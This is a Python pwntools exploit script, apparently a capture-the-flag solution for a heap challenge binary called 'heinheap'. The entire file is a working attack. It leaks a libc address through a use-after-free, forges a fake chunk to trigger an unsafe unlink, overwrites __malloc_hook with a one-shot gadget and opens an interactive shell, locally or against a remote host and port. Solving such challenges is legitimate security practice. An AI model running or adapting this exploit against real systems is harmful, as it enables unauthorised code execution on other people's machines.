from pwn import *

def alloc(idx, size, data):
	r.sendlineafter('Exit\n', '1')
	r.sendlineafter('Index: \n', str(idx))
	r.sendlineafter('size: \n', str(size))

	if size > len(data):
		data += '\n'
	r.sendafter('content: \n', data)

	return

def edit(idx, data, size):
	r.sendlineafter('Exit\n', '2')
	r.sendlineafter('Index: \n', str(idx))

	if size > len(data):
		data += '\n'
	r.sendafter('content: \n', data)

	return

def dump(idx):
	r.sendlineafter('Exit\n', '3')
	r.sendlineafter('Index: \n', str(idx))

	return u64(r.recv(6).ljust(8, '\x00'))

def free(idx):
	r.sendlineafter('Exit\n', '4')	
	r.sendlineafter('Index: \n', str(idx))

	return

def pwn():

	''' --==[[ unsafe unlink ]]==-- '''

	# Buffer's address
	buf   = '0x' 
	buf  += r.recv(12)
	buf   = int(buf, 16)
	array = buf + 0x80


	log.success('Buffer: 0x{:x}'.format(buf))
	log.success('Array:  0x{:x}'.format(array))

	alloc(0, 0x200, 'A'*8)  # 0
	alloc(1, 0x68,  'B'*8)  # 1

	free(0)

	# Abuse UAF
	leak     = dump(0)
	libc     = leak - 0x3c27b8
	mhook    = libc + 0x3c2740
	one_shot = libc + 0xea33d
	
	log.success('Libc:   0x{:x}'.format(libc))
	log.success('mhook:  0x{:x}'.format(mhook))

	alloc(2, 0x20, 'C'*8)  # 2
	alloc(3, 0x20, 'D'*8)  # 3
	alloc(4, 0x20, 'E'*8)  # 4
	alloc(5, 0x20, 'F'*8)  # 5

	# Craft fake chunk 	
	FD = array - (3*8)
	BK = array - (2*8)

	fake_chunk  = p64(0)
	fake_chunk += p64(0x8)
	fake_chunk += p64(FD)
	fake_chunk += p64(BK)
	fake_chunk += p64(0x20)
	fake_chunk += p64(0x90)

	edit(0, fake_chunk, 0x200)
  
	# Trigger unsafe unlink
	free(3)

	# Overwrite 0th entry with __malloc_hook's address
	edit(0, p64(0) * 3 + p64(mhook), 0x200)


	# __malloc_hook => one shot gadget
	edit(0, p64(one_shot), 0x200)

	# Trigger __malloc_hook by requesting a new allocation
	r.sendlineafter('Exit\n', '1')
	r.sendlineafter('Index: \n', '5')
	r.sendlineafter('size: \n', str(0x20))

	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        pwn()
    else:
        r = process('./heinheap')
        pause()
        pwn()
